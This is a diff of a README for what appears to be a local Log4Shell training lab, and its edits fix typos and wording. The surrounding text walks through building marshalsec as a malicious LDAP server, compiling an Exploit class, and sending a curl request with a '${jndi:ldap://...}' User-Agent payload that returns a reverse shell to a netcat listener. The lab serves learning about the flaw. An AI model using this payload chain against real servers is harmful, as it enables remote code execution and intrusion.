@@ -88,7 +88,7 @@ Now that we have some components working, let's exploit this thing...
 ## Marshalsec
 The marshalsec project is an excellent resource for understanding this type of attack in detail. Essentially, it acts as a malicous LDAP server that then redirects any request to a malicous web server hosting the .class file. I highly recommend reviewing some of the documentation posted on mbechler's Github repo prior to using marshalsec: https://github.com/mbechler/marshalsec
 
-If you decide to skip the technical details and documentation, clone that repo and change directory to it. Now, before you build that java project, I recommend adding a one line debug statement in the LDAPRefServer.java file. This print statement will be useful when capture the LDAP query from the vulnerable server.
+If you decide to skip the technical details and documentation, clone that repo and change directory to it. Now, before you build that java project, I recommend adding a one line debug statement in the LDAPRefServer.java file. This print statement will be useful when capturing the LDAP query from the vulnerable server.
 
 Using your favorite text editor, edit the following file and add the line as shown in the code block below, in the ```processSearchResult()``` method.
 
@@ -118,7 +118,7 @@ Change directory back to the root of the marshalsec folder and execute maven.
 mvn clean package -DskipTests
 ```
 
-If there are no build errors, you should see the newly created /marshalsec/target directory with the ```marshalsec-0.0.3-SNAPSHOT-all.jar`` file included.
+If there are no build errors, you should see the newly created /marshalsec/target directory with the ```marshalsec-0.0.3-SNAPSHOT-all.jar``` file included.
 
 Let's set up the rest of our attacker tools before we execute our marshalsec malicious LDAP server.
 
@@ -130,7 +130,7 @@ javac Exploit.java
 ```
 If you do not get any errors, you should have an ```Exploit.class``` file.
 
-Ok. That should do it. You should have everything you need compiled and Web Server running. Again, assuming you're running this test on a Linux server, you will open at least 5 Terminal windows.
+That should do it. You should have everything you need compiled and Web Server running. Again, assuming you're running this test on a Linux server, you will open at least 5 Terminal windows.
 
 Terminal 1: Run marshalsec 
 ```bash
@@ -152,7 +152,7 @@ Terminal 5: Submit your payload using a simple cURL command.
 ```bash
 curl -vv http://localhost:8080/vuln4japi/api -H 'User-Agent: ${jndi:ldap://localhost:1389/a}'
 ```
-If all works as expected, you should have a shell forwarded to your netcat listener on port 8001. Review all your Terminal windows and observe the behavior in each one of them looking for any typos or syntax errors. There's alot going on here so human error is alway in play. Give it a few runs until you get it down. You may have to modify the source a little, but hey, that's what its for.
+If all works as expected, you should have a shell forwarded to your netcat listener on port 8001. Review all your Terminal windows and observe the behavior in each one of them looking for any typos or syntax errors. There's alot going on here so human error is always in play. Give it a few runs until you get it down. You may have to modify the source a little, but hey, that's how we learn. ;-)
 
 I hope you enjoy learning from this project as much as I enjoyed putting it together. Find me on twitter @offswitchsec if you have any feedback or comments. Enjoy and Happy Hacking!
 
